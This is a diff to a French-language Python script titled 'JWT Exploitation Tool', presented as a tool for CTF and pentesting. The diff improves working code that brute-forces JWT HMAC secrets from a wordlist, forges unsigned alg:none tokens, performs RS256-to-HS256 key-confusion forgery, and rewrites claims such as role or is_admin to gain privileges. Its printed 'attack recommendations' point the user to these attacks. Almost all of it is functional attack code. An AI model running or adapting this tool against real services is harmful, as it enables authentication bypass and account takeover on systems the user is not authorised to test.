@@ -2,13 +2,18 @@
 """
 JWT Exploitation Tool by H8Laws — corrected & improved
 Outil interactif pour analyser, manipuler et tester des JWT (CTF / pentest)
-Améliorations apportées :
- - Correction de la génération du token (pas de point final superflu pour alg=none)
- - Support HS256 / HS384 / HS512 pour la création de signatures
- - parse_jwt accepte maintenant header.payload (2 parties) et normalise
- - modify_claims : conversions sécurisées de types, vérification avant .lower()
- - Robustesse réseau (requests optionnel), erreurs mieux gérées
- - Petites améliorations d'affichage et recommandations
+
+Améliorations et corrections apportées :
+ - base64url encode/decode robustes (urlsafe_b64*)
+ - base64url_decode accepte str/bytes et gère correctement le padding
+ - safe_json_loads accepte n'importe quel JSON et retourne None si invalide
+ - create_jwt: pas de '.' final pour alg=none, support HS256/HS384/HS512
+ - brute_force_secret: gestion correcte d'une signature cible vide,
+   meilleure gestion du wordlist et des erreurs
+ - test_rs256_to_hs256: plus d'informations lorsque pas de clé fournie
+ - modify_claims: conversion de types via json.loads quand possible
+ - full_analysis: détection RS384, recommandations améliorées
+ - ajout de verify_hmac pour vérification locale de signatures HMAC
 """
 
 import base64
@@ -19,7 +24,7 @@ import sys
 import time
 import re
 from datetime import datetime, timedelta
-from typing import Optional, Dict, Tuple, List
+from typing import Optional, Dict, Tuple, List, Any
 
 # Tentative d'importer requests mais ne pas planter si absent
 try:
@@ -50,37 +55,43 @@ def banner() -> None:
     print(f"{YELLOW}          Brute Force | Alg None | RS256/HS256 | Token Abuse{RESET}\n")
 
 # === Fonctions utilitaires JWT ===
-def base64url_decode(data: str) -> bytes:
-    """Décode du base64url en bytes (gère le padding manquant)."""
+def base64url_decode(data: Any) -> bytes:
+    """Décode du base64url en bytes (gère le padding manquant). Accepte str ou bytes."""
     if isinstance(data, str):
-        # Remplacer les caractères URL-safe
-        data = data.replace('-', '+').replace('_', '/')
-        # Ajouter le padding manquant (0..3 '=')
-        padding = (-len(data)) % 4
-        if padding:
-            data += '=' * padding
-        return base64.b64decode(data)
-    raise TypeError("base64url_decode attend une chaîne")
+        b = data.encode('utf-8')
+    elif isinstance(data, (bytes, bytearray)):
+        b = bytes(data)
+    else:
+        raise TypeError("base64url_decode attend une chaîne ou des bytes")
+
+    # Ajouter le padding manquant
+    padding = (-len(b)) % 4
+    if padding:
+        b += b'=' * padding
+    try:
+        return base64.urlsafe_b64decode(b)
+    except Exception as e:
+        raise ValueError(f"base64url_decode impossible: {e}")
 
 def base64url_encode(data: bytes) -> str:
     """Encode en base64url (retire le padding)."""
     if not isinstance(data, (bytes, bytearray)):
         raise TypeError("base64url_encode attend bytes")
-    encoded = base64.b64encode(data).decode('utf-8')
-    return encoded.rstrip('=').replace('+', '-').replace('/', '_')
+    encoded = base64.urlsafe_b64encode(bytes(data)).decode('utf-8')
+    return encoded.rstrip('=')
 
-def safe_json_loads(b: bytes) -> Optional[Dict]:
-    """Charge des bytes JSON en dict en gérant les erreurs"""
+def safe_json_loads(b: Any) -> Optional[Any]:
+    """Charge des bytes/str JSON en objet Python en gérant les erreurs."""
     try:
         if isinstance(b, (bytes, bytearray)):
-            s = b.decode('utf-8', errors='ignore')
+            s = b.decode('utf-8', errors='strict')
         else:
             s = str(b)
         return json.loads(s)
     except Exception:
         return None
 
-def parse_jwt(token: str) -> Optional[Dict]:
+def parse_jwt(token: str) -> Optional[Dict[str, Any]]:
     """
     Parse un JWT et retourne header, payload, signature, raw_parts.
     Accepte les tokens à 2 parties (header.payload) en les normalisant.
@@ -95,17 +106,33 @@ def parse_jwt(token: str) -> Optional[Dict]:
         if len(parts) == 2:
             parts.append('')
 
-        header = safe_json_loads(base64url_decode(parts[0]))
-        payload = safe_json_loads(base64url_decode(parts[1]))
+        try:
+            header_obj = safe_json_loads(base64url_decode(parts[0]))
+        except Exception as e:
+            print(f"{RED}[-] Erreur décodage header base64url : {e}{RESET}")
+            return None
+
+        try:
+            payload_obj = safe_json_loads(base64url_decode(parts[1]))
+        except Exception as e:
+            print(f"{RED}[-] Erreur décodage payload base64url : {e}{RESET}")
+            return None
+
         signature = parts[2]
 
-        if header is None or payload is None:
+        if header_obj is None or payload_obj is None:
             print(f"{RED}[-] Erreur : header ou payload non décodable en JSON{RESET}")
             return None
 
+        # Assurer que header/payload sont des objets (dict)
+        if not isinstance(header_obj, dict):
+            print(f"{YELLOW}[-] Warning: header JSON n'est pas un objet/dict (type={type(header_obj).__name__}){RESET}")
+        if not isinstance(payload_obj, dict):
+            print(f"{YELLOW}[-] Warning: payload JSON n'est pas un objet/dict (type={type(payload_obj).__name__}){RESET}")
+
         return {
-            'header': header,
-            'payload': payload,
+            'header': header_obj,
+            'payload': payload_obj,
             'signature': signature,
             'raw_parts': parts
         }
@@ -113,17 +140,23 @@ def parse_jwt(token: str) -> Optional[Dict]:
         print(f"{RED}[-] Erreur lors du parsing du JWT : {e}{RESET}")
         return None
 
-def display_jwt_info(parsed: Dict) -> None:
+def display_jwt_info(parsed: Dict[str, Any]) -> None:
     """Affiche les informations du JWT de manière formatée"""
     print(f"\n{BLUE}{'='*70}{RESET}")
     print(f"{CYAN}📋 JWT Information{RESET}")
     print(f"{BLUE}{'='*70}{RESET}\n")
 
     print(f"{GREEN}[Header]{RESET}")
-    print(json.dumps(parsed['header'], indent=2, ensure_ascii=False))
+    try:
+        print(json.dumps(parsed.get('header', {}), indent=2, ensure_ascii=False))
+    except Exception:
+        print(parsed.get('header', {}))
 
     print(f"\n{GREEN}[Payload]{RESET}")
-    print(json.dumps(parsed['payload'], indent=2, ensure_ascii=False))
+    try:
+        print(json.dumps(parsed.get('payload', {}), indent=2, ensure_ascii=False))
+    except Exception:
+        print(parsed.get('payload', {}))
 
     print(f"\n{GREEN}[Signature]{RESET}")
     sig = parsed.get('signature', '')
@@ -133,9 +166,10 @@ def display_jwt_info(parsed: Dict) -> None:
         print(f"{YELLOW}<empty>{RESET}")
 
     # Informations utiles
-    if 'exp' in parsed['payload']:
+    payload = parsed.get('payload', {})
+    if isinstance(payload, dict) and 'exp' in payload:
         try:
-            exp_timestamp = int(parsed['payload']['exp'])
+            exp_timestamp = int(payload['exp'])
             exp_date = datetime.fromtimestamp(exp_timestamp)
             now = datetime.now()
             print(f"\n{YELLOW}⏰ Expiration : {exp_date.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
@@ -152,19 +186,17 @@ def display_jwt_info(parsed: Dict) -> None:
 
     print(f"{BLUE}{'='*70}{RESET}\n")
 
-def create_jwt(header: Dict, payload: Dict, secret: str = "", force_hs_alg: Optional[str] = None) -> str:
+def create_jwt(header: Dict[str, Any], payload: Dict[str, Any], secret: str = "", force_hs_alg: Optional[str] = None) -> str:
     """
     Crée un JWT à partir du header et payload.
     - Si alg == 'none' -> retourne 'header.payload' (sans point final).
     - Supporte HS256, HS384, HS512 quand secret fourni.
     - force_hs_alg : optionnel, permet de forcer la valeur du champ 'alg' dans l'en-tête
-      (ex: 'HS256') - utile quand on convertit RS256 -> HS256.
     """
-    # Préparer header/payload encodés
     header_to_use = dict(header)  # copy
     if force_hs_alg:
         header_to_use['alg'] = force_hs_alg
-    alg = header_to_use.get('alg', '').upper()
+    alg = str(header_to_use.get('alg', '')).upper()
 
     header_encoded = base64url_encode(json.dumps(header_to_use, separators=(',', ':'), ensure_ascii=False).encode('utf-8'))
     payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':'), ensure_ascii=False).encode('utf-8'))
@@ -177,20 +209,18 @@ def create_jwt(header: Dict, payload: Dict, secret: str = "", force_hs_alg: Opti
     elif secret:
         # Choisir l'algorithme HMAC
         if alg == 'HS256':
-            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+            digest = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hashlib.sha256).digest()
             signature = base64url_encode(digest)
         elif alg == 'HS384':
-            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
+            digest = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hashlib.sha384).digest()
             signature = base64url_encode(digest)
         elif alg == 'HS512':
-            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
+            digest = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hashlib.sha512).digest()
             signature = base64url_encode(digest)
         else:
-            # Algorithme non supporté pour la signature automatique
             print(f"{YELLOW}[!] Algorithme {alg} non supporté pour la signature automatique{RESET}")
             signature = ""
     else:
-        # Pas de secret fourni -> signature vide
         signature = ""
 
     # Retourner sans trailing dot si signature vide
@@ -198,6 +228,26 @@ def create_jwt(header: Dict, payload: Dict, secret: str = "", force_hs_alg: Opti
         return f"{message}.{signature}"
     else:
         return message
+
+def verify_hmac(token: str, secret: str) -> bool:
+    """
+    Vérifie localement la signature HMAC d'un token avec le secret donné.
+    Retourne True si elle correspond, False sinon ou si pas applicable.
+    """
+    parsed = parse_jwt(token)
+    if not parsed:
+        return False
+    alg = str(parsed['header'].get('alg', '')).upper()
+    if alg not in ('HS256', 'HS384', 'HS512'):
+        return False
+    message = f"{parsed['raw_parts'][0]}.{parsed['raw_parts'][1]}"
+    hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
+    hash_func = hash_map.get(alg, hashlib.sha256)
+    try:
+        expected = base64url_encode(hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hash_func).digest())
+        return expected == parsed.get('signature', '')
+    except Exception:
+        return False
 
 # === 1. Brute Force de secret faible ===
 def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_attempts: Optional[int] = None) -> Optional[str]:
@@ -208,7 +258,7 @@ def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_atte
     if not parsed:
         return None
 
-    alg = parsed['header'].get('alg', 'HS256').upper()
+    alg = str(parsed['header'].get('alg', 'HS256')).upper()
     if alg not in ['HS256', 'HS512', 'HS384']:
         print(f"{RED}[-] L'algorithme {alg} n'est pas supporté pour le brute force (seuls HS256/HS384/HS512){RESET}")
         return None
@@ -227,22 +277,25 @@ def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_atte
     else:
         try:
             with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
-                wordlist = [line.strip() for line in f if line.strip()]
+                wordlist = [line.rstrip('\n') for line in f if line.strip() or line == '']
             print(f"{GREEN}[+] Wordlist chargée : {len(wordlist)} entrées{RESET}")
         except Exception as e:
             print(f"{RED}[-] Erreur lors de la lecture de la wordlist : {e}{RESET}")
             return None
 
-    # Message à signer
     message = f"{parsed['raw_parts'][0]}.{parsed['raw_parts'][1]}"
     target_signature = parsed.get('signature', '')
 
-    # Choisir la fonction de hash
-    hash_func = {
+    if not target_signature:
+        print(f"{RED}[-] Le token n'a pas de signature cible (signature vide). Brute force impossible.{RESET}")
+        return None
+
+    hash_func_map = {
         'HS256': hashlib.sha256,
         'HS384': hashlib.sha384,
         'HS512': hashlib.sha512
-    }.get(alg, hashlib.sha256)
+    }
+    hash_func = hash_func_map.get(alg, hashlib.sha256)
 
     total = len(wordlist)
     if total == 0:
@@ -259,10 +312,10 @@ def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_atte
         if max_attempts and attempts > max_attempts:
             break
 
+        # secret peut être vide
         try:
-            sig = base64url_encode(hmac.new(secret.encode(), message.encode(), hash_func).digest())
+            sig = base64url_encode(hmac.new(str(secret).encode('utf-8'), message.encode('utf-8'), hash_func).digest())
         except Exception:
-            # problème d'encodage du secret
             continue
 
         if sig == target_signature:
@@ -277,7 +330,7 @@ def brute_force_secret(token: str, wordlist_path: Optional[str] = None, max_atte
             return secret
 
         if attempts % 100 == 0 or attempts == total:
-            print(f"{YELLOW}[*] Testé {attempts}/{total} secrets...{RESET}", end='\r')
+            print(f"{YELLOW}[*] Testé {attempts}/{total} secrets...{RESET}", end='\r', flush=True)
 
     elapsed = time.time() - start_time
     print(f"\n{RED}[-] Secret non trouvé après {attempts} tentatives ({elapsed:.2f}s){RESET}\n")
@@ -295,25 +348,25 @@ def test_alg_none(token: str) -> List[Tuple[str, str]]:
     variants: List[Tuple[str, str]] = []
 
     # Variante 1: alg = "none" (minuscule)
-    header1 = parsed['header'].copy()
+    header1 = dict(parsed['header'])
     header1['alg'] = 'none'
     token1 = create_jwt(header1, parsed['payload'])
     variants.append(('none (minuscule)', token1))
 
     # Variante 2: alg = "None" (capitalisé)
-    header2 = parsed['header'].copy()
+    header2 = dict(parsed['header'])
     header2['alg'] = 'None'
     token2 = create_jwt(header2, parsed['payload'])
     variants.append(('None (capitalisé)', token2))
 
     # Variante 3: alg = "NONE" (majuscule)
-    header3 = parsed['header'].copy()
+    header3 = dict(parsed['header'])
     header3['alg'] = 'NONE'
     token3 = create_jwt(header3, parsed['payload'])
     variants.append(('NONE (majuscule)', token3))
 
     # Variante 4: Sans signature mais avec point final (certains serveurs attendent un '.' final)
-    header4 = parsed['header'].copy()
+    header4 = dict(parsed['header'])
     header4['alg'] = 'none'
     token4 = create_jwt(header4, parsed['payload']) + '.'
     variants.append(('none avec point final', token4))
@@ -335,14 +388,13 @@ def test_rs256_to_hs256(token: str, public_key_path: Optional[str] = None) -> Op
     if not parsed:
         return None
 
-    alg = parsed['header'].get('alg', '').upper()
+    alg = str(parsed['header'].get('alg', '')).upper()
     if alg != 'RS256':
-        print(f"{YELLOW}[!] Le token utilise l'algorithme {alg}, pas RS256{RESET}")
-        print(f"{YELLOW}[!] Cette attaque fonctionne quand le serveur attend RS256{RESET}")
+        print(f"{YELLOW}[!] Le token utilise l'algorithme {alg}, cette attaque cible RS256 principalement{RESET}")
 
     if not public_key_path:
         # Génération d'un token HS256 avec secrets communs pour tests rapides
-        header_hs256 = parsed['header'].copy()
+        header_hs256 = dict(parsed['header'])
         header_hs256['alg'] = 'HS256'
 
         common_keys = ['public_key', 'public', 'key', '-----BEGIN PUBLIC KEY-----']
@@ -360,7 +412,7 @@ def test_rs256_to_hs256(token: str, public_key_path: Optional[str] = None) -> Op
         print(f"{GREEN}[+] Clé publique chargée{RESET}\n")
 
         # Forcer HS256 et utiliser la clé publique comme secret
-        header_hs256 = parsed['header'].copy()
+        header_hs256 = dict(parsed['header'])
         header_hs256['alg'] = 'HS256'
 
         token_hs256 = create_jwt(header_hs256, parsed['payload'], public_key)
@@ -395,7 +447,7 @@ def modify_claims(token: str) -> Optional[str]:
 
     choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()
 
-    new_payload = dict(parsed['payload'])  # copy
+    new_payload = dict(parsed['payload']) if isinstance(parsed['payload'], dict) else {}
 
     if choice == '1':
         key = input(f"{CYAN}[?] Nom du claim à modifier : {RESET}").strip()
@@ -403,19 +455,22 @@ def modify_claims(token: str) -> Optional[str]:
             print(f"{YELLOW}Valeur actuelle : {new_payload[key]}{RESET}")
             value_raw = input(f"{CYAN}[?] Nouvelle valeur : {RESET}").strip()
 
-            # Tenter de convertir en int/float
-            value_converted = value_raw
+            # Tenter de convertir proprement : d'abord JSON (true,false,null,numbers,objects), sinon fallback
+            value_converted: Any = value_raw
             try:
-                if value_raw.lower() in ('true', 'false'):
-                    value_converted = value_raw.lower() == 'true'
-                else:
-                    if '.' in value_raw:
-                        value_converted = float(value_raw)
-                    else:
-                        value_converted = int(value_raw)
+                value_converted = json.loads(value_raw)
             except Exception:
-                # conserver la chaine si conversion échoue
-                value_converted = value_raw
+                try:
+                    lr = value_raw.lower()
+                    if lr in ('true', 'false'):
+                        value_converted = lr == 'true'
+                    else:
+                        if '.' in value_raw:
+                            value_converted = float(value_raw)
+                        else:
+                            value_converted = int(value_raw)
+                except Exception:
+                    value_converted = value_raw
 
             new_payload[key] = value_converted
         else:
@@ -426,17 +481,20 @@ def modify_claims(token: str) -> Optional[str]:
         key = input(f"{CYAN}[?] Nom du nouveau claim : {RESET}").strip()
         value_raw = input(f"{CYAN}[?] Valeur : {RESET}").strip()
 
-        value_converted = value_raw
         try:
-            if value_raw.lower() in ('true', 'false'):
-                value_converted = value_raw.lower() == 'true'
-            else:
-                if '.' in value_raw:
-                    value_converted = float(value_raw)
-                else:
-                    value_converted = int(value_raw)
+            value_converted = json.loads(value_raw)
         except Exception:
-            value_converted = value_raw
+            try:
+                lr = value_raw.lower()
+                if lr in ('true', 'false'):
+                    value_converted = lr == 'true'
+                else:
+                    if '.' in value_raw:
+                        value_converted = float(value_raw)
+                    else:
+                        value_converted = int(value_raw)
+            except Exception:
+                value_converted = value_raw
 
         new_payload[key] = value_converted
 
@@ -490,7 +548,10 @@ def modify_claims(token: str) -> Optional[str]:
 
     # Générer le nouveau token
     print(f"\n{YELLOW}[*] Nouveau payload :{RESET}")
-    print(json.dumps(new_payload, indent=2, ensure_ascii=False))
+    try:
+        print(json.dumps(new_payload, indent=2, ensure_ascii=False))
+    except Exception:
+        print(new_payload)
 
     print(f"\n{YELLOW}[?] Voulez-vous signer le token ?{RESET}")
     print(f"  1. Pas de signature (alg:none)")
@@ -505,7 +566,6 @@ def modify_claims(token: str) -> Optional[str]:
         new_token = create_jwt(header, new_payload)
     elif sign_choice == '2':
         secret = input(f"{CYAN}[?] Secret HMAC : {RESET}").strip()
-        # Forcer HS256 si on signe avec un secret
         header = dict(parsed['header'])
         header['alg'] = 'HS256'
         new_token = create_jwt(header, new_payload, secret)
@@ -615,19 +675,19 @@ def full_analysis(token: str) -> None:
     issues: List[str] = []
 
     # Vérifier l'algorithme
-    alg = parsed['header'].get('alg', '').upper()
+    alg = str(parsed['header'].get('alg', '')).upper()
     if alg == 'NONE':
         issues.append(f"{RED}[!] CRITIQUE : Algorithme 'none' utilisé (pas de signature){RESET}")
     elif alg in ['HS256', 'HS512', 'HS384']:
         issues.append(f"{YELLOW}[!] Algorithme symétrique ({alg}) - Vulnérable au brute force{RESET}")
-    elif alg in ['RS256', 'RS512']:
+    elif alg in ['RS256', 'RS384', 'RS512']:
         issues.append(f"{GREEN}[✓] Algorithme asymétrique ({alg}) - Plus sécurisé{RESET}")
         issues.append(f"{YELLOW}[!] Vérifier la confusion RS256/HS256{RESET}")
     else:
         issues.append(f"{YELLOW}[!] Algorithme inconnu ou non standard : {alg}{RESET}")
 
     # Vérifier l'expiration
-    if 'exp' not in parsed['payload']:
+    if not isinstance(parsed['payload'], dict) or 'exp' not in parsed['payload']:
         issues.append(f"{RED}[!] CRITIQUE : Pas d'expiration (exp) définie{RESET}")
     else:
         try:
@@ -644,10 +704,11 @@ def full_analysis(token: str) -> None:
 
     # Vérifier les claims sensibles
     sensitive_claims = ['is_admin', 'admin', 'role', 'permissions', 'scope']
-    for claim in sensitive_claims:
-        if claim in parsed['payload']:
-            value = parsed['payload'][claim]
-            issues.append(f"{YELLOW}[!] Claim sensible trouvé : {claim} = {value}{RESET}")
+    if isinstance(parsed['payload'], dict):
+        for claim in sensitive_claims:
+            if claim in parsed['payload']:
+                value = parsed['payload'][claim]
+                issues.append(f"{YELLOW}[!] Claim sensible trouvé : {claim} = {value}{RESET}")
 
     # Vérifier la taille
     if len(token) < 100:
@@ -661,16 +722,16 @@ def full_analysis(token: str) -> None:
     print(f"\n{CYAN}💡 Recommandations d'attaque :{RESET}\n")
 
     if alg in ['HS256', 'HS512', 'HS384']:
-        print(f"  {GREEN}→{RESET} Lancer un brute force du secret")
+        print(f"  {GREEN}→{RESET} Lancer un brute force du secret (brute_force_secret)")
 
     if alg != 'NONE':
-        print(f"  {GREEN}→{RESET} Tester la vulnérabilité alg:none")
+        print(f"  {GREEN}→{RESET} Tester la vulnérabilité alg:none (test_alg_none)")
 
-    if alg in ['RS256', 'RS512']:
-        print(f"  {GREEN}→{RESET} Tester la confusion RS256/HS256")
+    if alg in ['RS256', 'RS384', 'RS512']:
+        print(f"  {GREEN}→{RESET} Tester la confusion RS256/HS256 (test_rs256_to_hs256)")
 
-    if 'is_admin' in parsed['payload'] or 'role' in parsed['payload']:
-        print(f"  {GREEN}→{RESET} Modifier les claims pour obtenir des privilèges")
+    if isinstance(parsed['payload'], dict) and ('is_admin' in parsed['payload'] or 'role' in parsed['payload']):
+        print(f"  {GREEN}→{RESET} Modifier les claims pour obtenir des privilèges (modify_claims)")
 
     print()
 
